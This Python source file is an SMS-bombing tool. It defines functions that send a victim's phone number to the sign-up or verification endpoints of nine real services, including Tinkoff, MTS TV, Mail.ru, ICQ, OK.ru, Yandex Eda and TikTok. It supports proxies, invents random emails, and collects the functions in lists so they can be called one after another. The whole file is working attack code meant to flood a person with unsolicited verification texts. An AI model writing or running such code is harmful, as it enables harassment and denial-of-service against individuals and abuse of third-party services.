import requests
import random
import json

email_domains = ["gmail.com", "yahoo.com", "hotmail.com", "aol.com", "msn.com", "wanadoo.fr", "comcast.net", "live.com", "free.fr", "gmx.de", "yandex.ru"]

def Citilink(phone: str, proxy={}):
    req = requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/', proxies=proxy)
    # print(req.content)
    data = {}
    try:
        data = json.loads(req.content)
    except Exception:
        pass
    if "type" in data:
        return "error"
    return "ok"


def Tinkoff(phone: str, proxy={}):
    req = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone}, proxies=proxy)
    data = {}
    try:
        data = json.loads(req.content)
    except Exception:
        pass
    # print(req.content)
    if "resultCode" in data:
        return "error"
    return "ok"


def Sunlight(phone: str, proxy={}):
    req = requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone}, proxies=proxy)
    data = {"status": {"code": 400}}
    try:
        data = json.loads(req.content)
    except Exception:
        pass
    # print(req.content)
    if data["status"]["code"] != "200":
        return "error"
    return "ok"


def MTS(phone: str, proxy={}):
    req = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, proxies=proxy)
    data = {"meta": {"status": "400"}}
    try:
        data = json.loads(req.content)
    except Exception:
        pass
    # print(req.content)
    if data["meta"]["status"] != "200":
        return "error"
    return "ok"


def MailRu(phone: str, proxy={}):
    random_email = ""
    for i in range(random.randint(7, 14)):
        random_email += random.choice("abcdefghijklmnopqrstuvwxyz")
    random_email += "@" + random.choice(email_domains)

    req = requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                        json={"phone": "+" + phone, "api": 2, "email": random_email, "x-email": random_email, }, proxies=proxy)
    data = {"status": "400"}
    try:
        data = json.loads(req.content)
    except Exception:
        pass
    # print(req.content)
    if data["status"] != "200":
        return "error"
    return "ok"


def ICQ(phone: str, proxy={}):
    req = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                              data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                    "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, proxies=proxy)
    data = {"response": {"statusCode": 400}}
    try:
        data = json.loads(req.content)
    except Exception:
        pass
    # print(req.content)
    if data["response"]["statusCode"] != 200:
        return "error"
    return "ok"


def OK(phone: str, proxy={}):
    req = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                        data={"st.r.phone": "+" + phone}, proxies=proxy)
    # print(req.status_code)
    if req.status_code != 200:
        return "error"
    return "ok"


def YandexEda(phone: str, proxy={}):
    req = requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + phone}, proxies=proxy)
    data = {}
    try:
        data = json.loads(req.content)
    except Exception:
        pass
    # print(req.content)
    if "code" in data:
        return "error"
    return "ok"


def TikTok(phone: str, proxy={}):
    req = requests.post("https://m.tiktok.com/node-a/send/download_link",
                        json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": phone[1:],
                              "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, proxies=proxy)
    data = {"BaseResp": {"StatusCode": -1}}
    try:
        data = json.loads(req.content)
    except Exception:
        pass
    # print(req.content)
    if data["BaseResp"]["StatusCode"] != 0:
        return "error"
    return "ok"


functions = [Citilink, Tinkoff, Sunlight, MTS, MailRu, ICQ, OK, YandexEda, TikTok]
names = ["Citilink", "Tinkoff", "Sunlight", "MTS", "MailRu", "ICQ", "OK", "YandexEda", "TikTok"]
